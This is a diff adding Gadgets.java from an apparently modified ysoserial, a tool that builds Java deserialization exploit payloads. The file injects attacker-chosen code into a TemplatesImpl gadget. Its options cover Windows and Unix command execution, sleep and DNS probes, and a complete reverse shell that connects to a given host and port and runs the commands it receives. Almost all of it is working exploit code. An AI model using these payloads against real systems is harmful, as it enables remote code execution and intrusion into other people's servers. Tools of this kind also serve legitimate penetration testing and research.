@@ -1,0 +1,215 @@
+package ysoserial.payloads.util;
+
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+
+import java.io.Serializable;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+import org.apache.commons.lang.StringUtils;
+
+import com.nqzero.permit.Permit;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+
+/*
+ * utility generator functions for common jdk-only gadgets
+ */
+@SuppressWarnings ( {
+    "restriction", "rawtypes", "unchecked"
+} )
+public class Gadgets {
+
+    static {
+        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
+        System.setProperty(DESERIALIZE_TRANSLET, "true");
+
+        // for RMI remote loading
+        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+    }
+
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
+
+        @Override
+        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+    }
+
+    // required to make TemplatesImpl happy
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
+    }
+
+
+    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
+    }
+
+
+    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+    }
+
+
+    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
+        allIfaces[ 0 ] = iface;
+        if ( ifaces.length > 0 ) {
+            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+        }
+        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
+    }
+
+
+    public static Map<String, Object> createMap ( final String key, final Object val ) {
+        final Map<String, Object> map = new HashMap<String, Object>();
+        map.put(key, val);
+        return map;
+    }
+
+
+    public static Object createTemplatesImpl ( final String command, final String attackType ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                command,
+                attackType,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImpl(command, attackType, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+    
+    public static <T> T createTemplatesImpl ( final String command, final String attackType, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+            throws Exception {
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
+        // default ysoserial exec global
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+            "\");";
+        
+        // federicodotta - EXEC with args win	
+        if(attackType.equals("exec_win")) {
+        	
+        	cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\",\"/C\",\"" + command.replaceAll("\"", "\\\"") + "\"});";
+        	
+        // federicodotta - EXEC with unix        	
+        } else if(attackType.equals("exec_unix")) {
+
+        	cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + command.replaceAll("\"", "\\\"") + "\"});";        	
+        	
+        // federicodotta - Java native sleep				
+        } else if(attackType.equals("sleep")) {
+   	 
+        	long timeToSleep = Long.parseLong(command);
+        	cmd = "java.lang.Thread.sleep((long)" + timeToSleep + ");";
+   	 
+        // federicodotta - Java native DNS resolution			
+        } else if(attackType.equals("dns")) {
+        	
+        	cmd = "java.net.InetAddress.getByName(\"" + command + "\");";
+			
+        // NickstaDB - Reverse shell
+        } else if(attackType.equals("java_reverse_shell")) {
+        	
+            if(command.split(":").length != 2) {
+                throw new IllegalArgumentException("Connect back command format is <host>:<port> (got " + command + ")");
+            }
+            String host = command.split(":")[0];
+            int port;
+            try {
+                port = Integer.parseInt(command.split(":")[1]);
+            } catch(NumberFormatException nfe) {
+                throw new IllegalArgumentException("Invalid port specified for connect back command (" + command.split(":")[2] + ")");
+            }
+            if(port < 1 || port > 65535) {
+                throw new IllegalArgumentException("Invalid port specified for connect back command (" + port + ")");
+            }
+            cmd = "java.net.Socket sck=null;java.io.OutputStream out;java.io.BufferedReader rdr;Process proc;String cmd=\"\";String " +
+                "os=System.getProperty(\"os.name\").toLowerCase(java.util.Locale.ENGLISH);try{sck=new java.net.Socket(java.net.Inet" +
+                "Address.getByName(\"" + host + "\")," + port + ");out=sck.getOutputStream();rdr=new java.io.BufferedReader(new java" +
+                ".io.InputStreamReader(sck.getInputStream()));while(cmd.trim().toLowerCase(java.util.Locale.ENGLISH).equals(\"exit\")" +
+                "==false){try{out.write(\"> \".getBytes(),0,\"> \".getBytes().length);cmd=rdr.readLine();if(cmd.trim().toLowerCase(" +
+                "java.util.Locale.ENGLISH).equals(\"exit\")==false){if(os.contains(\"win\")){proc=new ProcessBuilder(new String[]{\"cmd\",\"/c\",\"" +
+                "\\\"\"+cmd.trim()+\"\\\"\"}).redirectErrorStream(true).start();}else{try{proc=new ProcessBuilder(new String[]{\"/bin/bash\",\"-c\"," +
+                "cmd.trim()}).redirectErrorStream(true).start();}catch(java.io.IOException ioe){if(ioe.getMessage().contains(\"Cannot " +
+                "run program\")){try{proc=new ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",cmd.trim()}).redirectErrorStream(true).start();}catch(" +
+                "java.io.IOException ioe2){if(ioe2.getMessage().contains(\"Cannot run program\")){throw new java.io.IOException(\"Non-" +
+                "Windows target and neither /bin/bash or /bin/sh is present.\");}else{throw ioe2;}}}else{throw ioe;}}}proc.waitFor();" +
+                "byte[] b=new byte[proc.getInputStream().available()];proc.getInputStream().read(b);out.write(b);}}catch(Exception ex" +
+                "){out.write((\"[-] Exception: \"+ex.toString()).getBytes());}}sck.close();}catch(Exception ex){if(sck!=null){try{sck" +
+                ".close();}catch(Exception ex2){}}}";
+        	
+        }
+
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
+            IllegalAccessException, InvocationTargetException {
+        HashMap s = new HashMap();
+        Reflections.setFieldValue(s, "size", 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        Reflections.setAccessible(nodeCons);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
+}
